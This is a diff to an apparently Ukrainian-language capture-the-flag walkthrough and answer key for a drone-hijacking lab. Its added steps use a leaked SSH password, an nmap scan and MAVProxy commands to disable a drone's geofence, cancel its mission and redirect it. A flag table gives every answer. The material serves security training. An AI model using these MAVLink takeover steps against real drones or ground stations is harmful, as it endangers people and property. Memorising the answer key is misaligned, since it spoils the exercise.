@@ -283,13 +283,135 @@ flag_final    REG_SZ    flag{f0und_th3_k3ys}
 
 ---
 
-## Update Server — підключення (фінал)
+## Flag_11 — SSH на Update Server
 
-**З Operator_station (вже в LAN):**
+**З Operator_station. Credentials з реєстру Windows Server (Flag_10):**
 ```bash
 ssh grayraven@10.10.50.180
 ```
 пароль: `grayraven124`
+
+Знайти флаг:
+```bash
+cat ~/flag.txt
+```
+
+**Flag:** `flag{update_server_compromised}`
+
+---
+
+## Flag_12 — Знайти мережу дронів
+
+**На Update Server. Шукати в конфігах та логах:**
+```bash
+ls /home/grayraven/
+grep -r "10.10.10" /home/grayraven/ 2>/dev/null
+```
+
+Мережа дронів: `10.10.10.0/24`
+
+**Flag:** `flag{10.10.10.0/24}`
+
+---
+
+## Flag_13 — Знайти GCS (Ground Control Station)
+
+**Сканування мережі дронів:**
+```bash
+nmap -sCV 10.10.10.0/24
+```
+
+GCS знаходиться на `10.10.10.40`
+
+**Flag:** `flag{10.10.10.40}`
+
+---
+
+## Flag_14 — Знайти дрон
+
+З того ж nmap результату — дрон на `10.10.10.30`
+
+**Flag:** `flag{10.10.10.30}`
+
+---
+
+## Flag_15 — Протокол зв'язку з дроном
+
+Стандартний протокол для БПЛА — MAVLink (дослідити документацію PX4 / ArduPilot).
+
+**Flag:** `flag{mavlink}`
+
+---
+
+## Flag_16 — Порт MAVLink
+
+**Шукати в конфігах на Update Server:**
+```bash
+grep -r "14550\|mavlink\|port" /home/grayraven/ 2>/dev/null
+```
+
+MAVLink порт GCS: `14550`
+
+**Flag:** `flag{14550}`
+
+---
+
+## Flag_17 — Підключення через MAVProxy
+
+**Підключитись до дрона через GCS:**
+```bash
+mavproxy.py --master=udpin:0.0.0.0:14560 --out=udpout:10.10.10.40:14550 --target-system 1 --target-component 1
+```
+
+**Flag:** `flag{YouAreOnRightWay}`
+
+---
+
+## Flag_18 — Geofence параметр
+
+**У MAVProxy сесії:**
+```
+param show GF_ACTION
+```
+
+Поточне значення `GF_ACTION = 2` (geofence активний).
+
+**Flag:** `flag{GF_ACTION}`
+
+---
+
+## Flag_19 — Вимкнути geofence
+
+**У MAVProxy сесії:**
+```
+param set GF_ACTION 0
+```
+
+**Flag:** `flag{injection_success_geofence_off}`
+
+---
+
+## Flag_20 — Скасувати місію (LOITER mode)
+
+**Переключити дрон з режиму MISSION в LOITER:**
+```
+long 176 1 5 0 0 0 0 0
+```
+
+`176` = MAV_CMD_DO_SET_MODE, `5` = LOITER mode
+
+**Flag:** `flag{m1ss1on_canceled_successfully}`
+
+---
+
+## Flag_21 — Відправити дрон на координати (фінал)
+
+**У MAVProxy сесії:**
+```
+guided 47.3959690 8.5569165 500
+```
+
+**Flag:** `flag{Y0u_W1N}`
 
 ---
 
@@ -303,7 +425,18 @@ ssh grayraven@10.10.50.180
 | 4 | `flag{n1ce_t0_s33_y0u}` | Operator_station MOTD | SSH |
 | 5 | `flag{Y0u_l1ke_privileges}` | flight_log_export.py | Command injection / sudo |
 | 6 | `flag{adfGt54DCf}` | backup_db.sh | Credential exposure |
-| 7 | `flag{0mg_RC3}` | DB system_config table | PostgreSQL COPY FROM PROGRAM RCE |
+| 7 | `flag{0mg_RC3}` | DB system_config table | PostgreSQL RCE |
 | 8 | `flag{sh4r3_1s_c4r3}` | deploy_update.ps1 | Anonymous SMB share |
 | 9 | `flag{unqu0ted_p4th_pwn}` | admin_notes.txt | Unquoted service path recon |
 | 10 | `flag{f0und_th3_k3ys}` | Windows Registry | WinRM + reg query |
+| 11 | `flag{update_server_compromised}` | ~/flag.txt | SSH на Update Server |
+| 12 | `flag{10.10.10.0/24}` | конфіги Update Server | Recon |
+| 13 | `flag{10.10.10.40}` | nmap 10.10.10.0/24 | Network scan |
+| 14 | `flag{10.10.10.30}` | nmap 10.10.10.0/24 | Network scan |
+| 15 | `flag{mavlink}` | документація PX4/ArduPilot | Research |
+| 16 | `flag{14550}` | конфіги Update Server | Recon |
+| 17 | `flag{YouAreOnRightWay}` | MAVProxy сесія | MAVProxy підключення |
+| 18 | `flag{GF_ACTION}` | param show GF_ACTION | MAVProxy recon |
+| 19 | `flag{injection_success_geofence_off}` | param set GF_ACTION 0 | MAVProxy injection |
+| 20 | `flag{m1ss1on_canceled_successfully}` | long 176 1 5 0 0 0 0 0 | MAVProxy LOITER |
+| 21 | `flag{Y0u_W1N}` | guided 47.39... | MAVProxy guided mode |
